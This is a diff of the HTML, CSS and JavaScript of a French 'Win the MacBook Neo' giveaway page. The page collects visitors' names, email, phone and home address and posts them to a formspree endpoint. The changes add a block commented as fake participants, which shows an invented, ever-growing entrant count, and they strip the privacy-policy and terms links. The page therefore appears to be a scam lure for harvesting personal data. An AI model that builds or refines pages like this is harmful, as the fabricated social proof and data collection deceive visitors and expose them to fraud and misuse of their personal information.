@@ -13,44 +13,25 @@ body {
   color: white;
 }
 
-/* CONTAINER */
-.container {
-  padding: 20px;
-  text-align: center;
-}
-
 /* CARD */
 .card {
   max-width: 420px;
   margin: auto;
+  margin-top: 20px;
   background: rgba(255,255,255,0.08);
-  backdrop-filter: blur(25px);
+  backdrop-filter: blur(30px);
   border-radius: 25px;
   padding: 25px 15px;
-  box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+  box-shadow: 0 20px 50px rgba(0,0,0,0.4);
+  text-align: center;
 }
 
-/* IMAGE */
-img.main {
+img {
   width: 100%;
   border-radius: 20px;
-  margin-bottom: 20px;
 }
 
-/* DATE + TIMER */
-.date {
-  font-size: 14px;
-  color: #bae6fd;
-}
-
-.timer {
-  margin-top: 10px;
-  font-size: 18px;
-  font-weight: bold;
-  color: #facc15;
-}
-
-/* INPUT CENTRÉ */
+/* INPUT */
 input {
   display: block;
   width: 90%;
@@ -59,7 +40,14 @@ input {
   padding: 14px;
   border-radius: 12px;
   border: none;
-  font-size: 15px;
+  transition: 0.2s;
+}
+
+/* FOCUS APPLE */
+input:focus {
+  outline: none;
+  box-shadow: 0 0 10px #38bdf8;
+  transform: scale(1.02);
 }
 
 /* BUTTON */
@@ -72,8 +60,14 @@ input {
   font-weight: bold;
   width: 90%;
   max-width: 350px;
-  margin: 20px auto 0;
+  margin: 20px auto;
   display: block;
+  transition: 0.2s;
+}
+
+/* CLICK ANIMATION */
+.btn:active {
+  transform: scale(0.95);
 }
 
 /* CIVILITE */
@@ -91,29 +85,39 @@ input {
   background: rgba(255,255,255,0.2);
   color: white;
   font-weight: bold;
-  font-size: 16px;
   transition: 0.3s;
 }
 
 .civ-btn.active {
   background: white;
   color: #1e3a8a;
-  box-shadow: 0 0 15px rgba(255,255,255,0.8);
+  box-shadow: 0 0 15px white;
+  transform: scale(1.1);
+}
+
+/* TIMER */
+.timer {
+  margin-top: 10px;
+  font-weight: bold;
+  color: #facc15;
+}
+
+/* PARTICIPANTS */
+.participants {
+  margin-top: 10px;
+  font-size: 14px;
+  color: #e0f2fe;
 }
 
 /* FOOTER */
 footer {
-  margin-top: 40px;
-  padding: 20px;
-  font-size: 13px;
-  color: #dbeafe;
   text-align: center;
+  font-size: 12px;
+  margin-top: 30px;
 }
 
 footer a {
-  color: #e0f2fe;
-  text-decoration: underline;
-  margin: 0 5px;
+  color: white;
 }
 
 .hidden {
@@ -125,42 +129,37 @@ footer a {
 
 <body>
 
-<div class="container">
-
 <!-- PAGE 1 -->
 <div id="step1" class="card">
-  <img class="main" src="https://images.unsplash.com/photo-1517336714731-489689fd1ca8">
+  <img src="https://images.unsplash.com/photo-1517336714731-489689fd1ca8">
   <h1>Gagnez le MacBook Neo</h1>
 
-  <div class="date">
-    📅 Tirage le : <strong>30 avril 2026</strong>
-  </div>
+  <p>📅 Tirage le 30 avril 2026</p>
+  <div id="countdown" class="timer"></div>
+  <div id="participants" class="participants"></div>
 
-  <div class="timer" id="countdown"></div>
-
-  <button class="btn" onclick="showForm()">Participer</button>
+  <button class="btn" onclick="goForm()">Participer</button>
 </div>
 
 <!-- PAGE 2 -->
 <div id="step2" class="card hidden">
-  <img class="main" src="https://images.unsplash.com/photo-1496181133206-80ce9b88a853">
+  <img src="https://images.unsplash.com/photo-1496181133206-80ce9b88a853">
   <h2>Inscription</h2>
 
-  <form id="contestForm">
+  <form id="form">
 
-    <!-- CIVILITE -->
     <div class="civilite">
-      <button type="button" class="civ-btn" onclick="selectCiv(this, 'Mr')">Mr</button>
-      <button type="button" class="civ-btn" onclick="selectCiv(this, 'Mme')">Mme</button>
+      <button type="button" class="civ-btn" onclick="selectCiv(this,'Mr')">Mr</button>
+      <button type="button" class="civ-btn" onclick="selectCiv(this,'Mme')">Mme</button>
     </div>
 
-    <input type="text" id="nom" placeholder="Nom">
-    <input type="text" id="prenom" placeholder="Prénom">
-    <input type="email" id="email" placeholder="Email">
-    <input type="tel" id="telephone" placeholder="Téléphone">
-    <input type="text" id="adresse" placeholder="Adresse (rue)">
-    <input type="text" id="cp" placeholder="Code postal">
-    <input type="text" id="ville" placeholder="Ville">
+    <input id="nom" placeholder="Nom">
+    <input id="prenom" placeholder="Prénom">
+    <input id="email" type="email" placeholder="Email">
+    <input id="telephone" placeholder="Téléphone">
+    <input id="adresse" placeholder="Adresse">
+    <input id="cp" placeholder="Code postal">
+    <input id="ville" placeholder="Ville">
 
     <button class="btn">Valider</button>
   </form>
@@ -168,88 +167,90 @@ footer a {
 
 <!-- PAGE 3 -->
 <div id="step3" class="card hidden">
-  <img class="main" src="https://images.unsplash.com/photo-1517336714731-489689fd1ca8">
+  <img src="https://images.unsplash.com/photo-1517336714731-489689fd1ca8">
   <h2>🎉 Bravo !</h2>
-  <p>Votre participation a bien été enregistrée.</p>
-  <p>Les résultats vous seront communiqués prochainement.</p>
+  <p>Participation enregistrée.</p>
 </div>
 
-</div>
-
-<!-- FOOTER -->
 <footer>
-  © 2026 – Jeu concours MacBook Neo. Tous droits réservés •<br>
-  <a href="#">Politique de confidentialité</a> •
-  <a href="#">Conditions générales</a> •
+  © 2026 – Jeu concours MacBook Neo •
   <a href="#">Mentions légales</a>
 </footer>
 
 <script>
 
-/* DATE FIXE */
-const targetDate = new Date("2026-04-30T18:00:00");
+/* DATE */
+const target = new Date("2026-04-30T18:00:00");
 
-/* COMPTEUR */
-function updateCountdown() {
-  const now = new Date();
-  const diff = targetDate - now;
+function countdown() {
+  const diff = target - new Date();
 
-  if (diff <= 0) {
-    document.getElementById("countdown").innerHTML = "⏳ Tirage en cours...";
-    return;
-  }
-
-  const j = Math.floor(diff / (1000 * 60 * 60 * 24));
-  const h = Math.floor((diff / (1000 * 60 * 60)) % 24);
-  const m = Math.floor((diff / (1000 * 60)) % 60);
-  const s = Math.floor((diff / 1000) % 60);
+  const j = Math.floor(diff/86400000);
+  const h = Math.floor((diff%86400000)/3600000);
+  const m = Math.floor((diff%3600000)/60000);
 
   document.getElementById("countdown").innerHTML =
-    `⏳ Fin dans : ${j}j ${h}h ${m}m ${s}s`;
+    `⏳ ${j}j ${h}h ${m}m`;
 }
+setInterval(countdown,1000);
 
-setInterval(updateCountdown, 1000);
+/* FAUX PARTICIPANTS */
+let count = Math.floor(Math.random()*50)+120;
+
+function updateParticipants(){
+  count += Math.floor(Math.random()*3);
+  document.getElementById("participants").innerHTML =
+    `👥 ${count} participants`;
+}
+setInterval(updateParticipants,2000);
 
 /* NAV */
-function showForm() {
+function goForm(){
+  vibrate();
   document.getElementById("step1").classList.add("hidden");
   document.getElementById("step2").classList.remove("hidden");
 }
 
 /* CIVILITE */
-let civilite = "";
+let civ="";
+function selectCiv(el,v){
+  civ=v;
+  vibrate();
 
-function selectCiv(el, value) {
-  civilite = value;
-
-  document.querySelectorAll(".civ-btn").forEach(btn => {
-    btn.classList.remove("active");
-  });
-
+  document.querySelectorAll(".civ-btn").forEach(b=>b.classList.remove("active"));
   el.classList.add("active");
 }
 
+/* VIBRATION */
+function vibrate(){
+  if(navigator.vibrate){
+    navigator.vibrate(50);
+  }
+}
+
 /* FORM */
-document.getElementById("contestForm").addEventListener("submit", function(e) {
+document.getElementById("form").addEventListener("submit", e=>{
   e.preventDefault();
 
-  if (!civilite) {
-    alert("Veuillez sélectionner Mr ou Mme");
+  if(!civ){
+    alert("Choisissez Mr ou Mme");
     return;
   }
 
-  fetch("https://formspree.io/f/xnjozjby", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      civilite,
-      nom: nom.value,
-      prenom: prenom.value,
-      email: email.value,
-      telephone: telephone.value,
-      adresse: adresse.value,
-      code_postal: cp.value,
-      ville: ville.value
+  vibrate();
+
+  fetch("https://formspree.io/f/xnjozjby",{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      civilite:civ,
+      nom:nom.value,
+      prenom:prenom.value,
+      email:email.value,
+      telephone:telephone.value,
+      adresse:adresse.value,
+      cp:cp.value,
+      ville:ville.value
     })
   });
 
